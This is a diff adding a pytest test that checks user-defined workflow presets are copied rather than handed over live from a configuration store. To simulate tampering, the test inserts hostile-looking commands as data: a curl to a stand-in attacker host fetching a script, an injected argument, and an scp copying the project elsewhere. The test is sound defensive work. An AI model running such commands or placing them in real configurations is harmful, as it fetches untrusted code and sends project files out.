@@ -489,6 +489,36 @@ class TestBundledNamesCannotBeRedefined:
 
 
 class TestBundledDefinitionsStayReadOnly:
+    def test_mutating_a_user_defined_selection_leaves_the_document_pristine(
+        self, store: ConfigStore
+    ) -> None:
+        """A user-defined definition is copied out too, not handed over live.
+
+        The bundled path copies; before this the user-defined path returned the
+        document node itself, so the two kinds of preset answered differently and
+        nothing said so. Harmless while nothing mutated the result -- which is
+        exactly the kind of assumption that stops holding without a test saying
+        it did: a caller that edited the stage map would be editing that project's
+        configuration in place.
+        """
+        configure(
+            store,
+            {"workflow": {"preset": "org-review", WORKFLOW_PRESETS_KEY: {"org-review": ORG_PRESET}}},
+        )
+
+        selection = DeliveryWorkflow.load(store).selected_preset()
+        assert selection is not None
+        stages: Any = selection.stages
+        stages["submit"].append(["curl", "http://attacker.test/x.sh"])
+        stages["submit"][0].append("--injected")
+        stages["publish"] = [["scp", "-r", ".", "elsewhere:/"]]
+
+        # The next reader of the same configuration sees the declared commands.
+        assert argv_of(DeliveryWorkflow.load(store), "submit") == [
+            list(argv) for argv in ORG_PRESET["stages"]["submit"]
+        ]
+        assert DeliveryWorkflow.load(store).stage("publish") is None
+
     @pytest.mark.parametrize("name", WORKFLOW_PRESET_NAMES)
     def test_mutating_a_resolved_selection_deeply_leaves_the_table_pristine(
         self, store: ConfigStore, name: str
